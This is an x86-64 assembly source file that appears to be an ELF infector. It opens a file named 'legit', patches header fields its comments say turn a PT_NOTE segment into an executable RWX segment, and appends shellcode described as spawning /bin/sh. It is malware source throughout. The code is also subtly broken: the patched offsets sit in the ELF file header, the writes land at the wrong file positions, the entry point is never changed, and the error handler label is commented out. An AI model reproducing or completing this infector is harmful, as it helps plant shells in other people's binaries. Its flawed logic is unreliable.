section .data
    legit_file db "legit", 0      ; Name of the file to infect
    error_message db "The injector program failed.", 10, 0 ; Error message
    buffer times 64 db 0          ; Buffer to read the ELF header
    segment_offset equ 32         ; Offset for the PT_NOTE segment
    flags_offset equ 36           ; Offset for permissions
    shellcode db 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, \
                 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05  ; Shellcode to open /bin/sh
    shellcode_size equ $-shellcode

section .text
    global _start

_start:
    ; Open the legit file for modification
    mov rax, 2                ; syscall: open
    mov rdi, legit_file       ; file to open
    mov rsi, 2                ; O_RDWR (read/write mode)
    syscall
    ; Check if file opened correctly
    test rax, rax
    js error_handler           ; If rax < 0 (error), jump to error handler

    ; Store the file descriptor
    mov rdi, rax              ; store the fd returned by open

    ; Load the ELF header
    mov rax, 0                ; syscall: read
    mov rsi, buffer           ; buffer to read the header
    mov rdx, 64               ; size of the ELF header
    syscall
    ; Check if read was successful
    test rax, rax
    js error_handler           ; Handle read error

    ; Modifications in the PT_NOTE segment
    mov dword [buffer + segment_offset], 1   ; Change PT_NOTE to PT_LOAD
    mov dword [buffer + flags_offset], 5     ; RWX flags

    ; Write the modified buffer back to the file
    mov rax, 1                ; syscall: write
    mov rsi, buffer           ; buffer with modified ELF header
    mov rdx, 64               ; size of the ELF header
    syscall
    ; Check if write was successful
    test rax, rax
    js error_handler           ; Handle write error

    ; Inject the shellcode at the end of the file
    mov rax, 1                ; syscall: write
    mov rsi, shellcode        ; your shellcode to open /bin/sh
    mov rdx, shellcode_size   ; size of the shellcode
    syscall
    ; Check if shellcode injection was successful
    test rax, rax
    js error_handler           ; Handle write error

    ; Close the file
    mov rax, 3                ; syscall: close
    syscall
    ; Check if close was successful
    test rax, rax
    js error_handler           ; Handle close error

    ; Exit cleanly
    mov rax, 60               ; syscall: exit
    xor rdi, rdi
    syscall

; error_handler:
;     ; Write error message to stderr (file descriptor 2)
;     mov rax, 1                ; syscall: write
;     mov rdi, 2                ; file descriptor 2 (stderr)
;     mov rsi, error_message    ; pointer to error message
;     mov rdx, 28               ; length of error message
;     syscall

;     ; Exit program
;     mov rax, 60               ; syscall: exit
;     xor rdi, rdi              ; return code 0
;     syscall